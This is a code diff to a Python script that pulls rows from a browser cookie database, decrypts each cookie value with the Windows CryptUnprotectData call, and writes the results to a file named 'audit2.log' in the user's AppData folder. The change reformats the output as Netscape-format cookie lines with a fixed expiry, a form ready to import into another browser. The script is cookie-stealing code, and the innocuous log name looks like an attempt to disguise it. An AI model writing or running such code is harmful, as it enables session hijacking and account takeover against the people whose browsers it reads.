@@ -34,11 +34,9 @@ for result in cursor.fetchall():
 	# Decrypt 
 	plaincookie = win32crypt.CryptUnprotectData(result[12], None, None, None, 0)[1]
 	if plaincookie:
-		txt_string = txt_string + 'Host key: ' + result[1] + '\n'
-		txt_string = txt_string + 'Path: ' + result[4] + '\n'
-		txt_string = txt_string + 'Name: ' + result[2] + '\n'
-		txt_string = txt_string + 'Value: ' + str(plaincookie) + '\n\n'
-
+        # netscape format cookies. 
+        # Nasty lazy code: All machines in domain always TRUE. Secure connection needed always FALSE. Expiration always 2026.
+		txt_string = txt_string + result[1] + '\tTRUE\t' + result[4] + '\tFALSE\t1767225599\t' + result[2] + '\t' + str(plaincookie) + '\n'
 
 txt_file_path = getenv(r"APPDATA") + r"\audit2.log"
 txt_file = open(txt_file_path, "w")
